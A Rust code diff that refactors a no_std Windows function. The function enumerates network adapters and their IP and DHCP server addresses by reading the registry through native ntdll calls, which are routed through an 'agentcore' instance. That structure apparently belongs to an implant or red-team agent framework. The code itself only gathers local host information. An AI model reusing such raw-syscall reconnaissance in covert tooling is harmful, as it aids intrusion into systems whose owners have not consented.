@@ -1,12 +1,13 @@
 use core::slice;
 
-use alloc::{format, string::String, vec::Vec};
-use rs2_winapi::ntregapi::KeyBasicInformation;
+extern crate alloc;
 
-use crate::{
-    nt_close, nt_enumerate_key,
-    nt_reg_api::{open_key, query_value},
-};
+use alloc::{format, string::String, vec::Vec};
+use rs2_win32::ntdef::KeyBasicInformation;
+
+use mod_agentcore::instance;
+
+use crate::nt_reg_api::{open_key, query_value};
 
 /// Main function to get the primary active IP addresses.
 ///
@@ -39,7 +40,7 @@ pub unsafe fn get_adapters_info() -> Result<Vec<(String, String, String)>, i32> 
         let mut result_length: u32 = 0;
 
         // Enumerate the subkeys of the opened registry key
-        let status = nt_enumerate_key(
+        let status = instance().ntdll.nt_enumerate_key.run(
             key_handle,
             index,
             0,
@@ -51,7 +52,7 @@ pub unsafe fn get_adapters_info() -> Result<Vec<(String, String, String)>, i32> 
         // If the enumeration fails, check if it's the first key or break the loop
         if status != 0 {
             if index == 0 {
-                nt_close(key_handle);
+                instance().ntdll.nt_close.run(key_handle);
                 return Err(status);
             } else {
                 break;
@@ -82,19 +83,19 @@ pub unsafe fn get_adapters_info() -> Result<Vec<(String, String, String)>, i32> 
         let mut ip_address = String::new();
 
         // Check if both DhcpIPAddress and DhcpServer values exist
-        if let Ok(ip_address_value) = query_value(sub_key_handle, "DhcpIPAddress") {
-            if let Ok(dhcp_server_value) = query_value(sub_key_handle, "DhcpServer") {
+        if let Ok(ip_address_value) = query_value(sub_key_handle, "DhcpIPAddress\0") {
+            if let Ok(dhcp_server_value) = query_value(sub_key_handle, "DhcpServer\0") {
                 ip_address = ip_address_value;
                 dhcp_server = dhcp_server_value;
             }
-        } else if let Ok(ip_address_value) = query_value(sub_key_handle, "IPAddress") {
+        } else if let Ok(ip_address_value) = query_value(sub_key_handle, "IPAddress\0") {
             ip_address = ip_address_value;
         }
 
         // If no IP address is found, skip to the next key
         if ip_address.is_empty() {
             index += 1;
-            nt_close(sub_key_handle);
+            instance().ntdll.nt_close.run(sub_key_handle);
             continue;
         }
 
@@ -114,7 +115,7 @@ pub unsafe fn get_adapters_info() -> Result<Vec<(String, String, String)>, i32> 
         };
 
         // Query the "Name" value from the connection key
-        if let Ok(name_value) = query_value(name_key_handle, "Name") {
+        if let Ok(name_value) = query_value(name_key_handle, "Name\0") {
             name = name_value;
         }
 
@@ -122,13 +123,13 @@ pub unsafe fn get_adapters_info() -> Result<Vec<(String, String, String)>, i32> 
         ip_addresses.push((name, ip_address, dhcp_server));
 
         // Close the handles to the subkey and name key
-        nt_close(sub_key_handle);
-        nt_close(name_key_handle);
+        instance().ntdll.nt_close.run(sub_key_handle);
+        instance().ntdll.nt_close.run(name_key_handle);
         index += 1;
     }
 
     // Close the handle to the main registry key
-    nt_close(key_handle);
+    instance().ntdll.nt_close.run(key_handle);
     Ok(ip_addresses)
 }
 
